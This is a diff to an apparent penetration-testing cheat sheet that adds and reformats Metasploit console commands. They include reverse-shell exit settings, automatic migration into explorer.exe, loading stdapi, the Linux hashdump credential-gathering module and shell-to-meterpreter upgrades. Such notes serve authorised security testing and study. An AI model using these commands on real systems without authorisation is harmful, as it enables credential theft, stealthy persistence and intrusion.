@@ -2419,11 +2419,11 @@ cp /tmp/poc.svg /var/www/html/convert_images/
 #### Metasploit
 
 ```c
-$ sudo msfdb run                   // start database
-$ sudo msfdb init                  // database initialization
-$ msfdb --use-defaults delete      // delete existing databases
-$ msfdb --use-defaults init        // database initialization
-$ msfdb status                     // database status
+sudo msfdb run                     // start database
+sudo msfdb init                    // database initialization
+msfdb --use-defaults delete        // delete existing databases
+msfdb --use-defaults init          // database initialization
+msfdb status                       // database status
 msf6> workspace                    // metasploit workspaces
 msf6> workspace -a <WORKSPACE>     // add a workspace
 msf6> workspace -r <WORKSPACE>     // rename a workspace
@@ -2453,11 +2453,16 @@ msf6 > jobs                        // showing all current jobs
 msf6 > show payloads               // displaying available payloads
 msf6 > set VERBOSE true            // enable verbose output
 msf6 > set forceexploit true       // exploits the target anyways
-msf6 > use post/PATH/TO/MODULE     // use post exploitation module
-msf6 > use post/linux/gather/hashdump    // use hashdump for Linux
-msf6 > use post/multi/manage/shell_to_meterpreter    // shell to meterpreter
+msf6 > set EXITFUNC thread         // reverse shell can exit without exit the program
+msf6 > set AutoLoadStdapi false    // disables autoload of stdapi
+msf6 > set PrependMigrate true     // enables automatic process migration
+msf6 > set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
+msf6 > use post/PATH/TO/MODULE                                    // use post exploitation module
+msf6 > use post/linux/gather/hashdump                             // use hashdump for Linux
+msf6 > use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
 msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
 C:\> > Ctrl + z                                  // put active meterpreter shell in background
+meterpreter > loadstdapi                         // load stdapi
 meterpreter > background                         // put meterpreter in background (same as "bg")
 meterpreter > shell                              // get a system shell
 meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
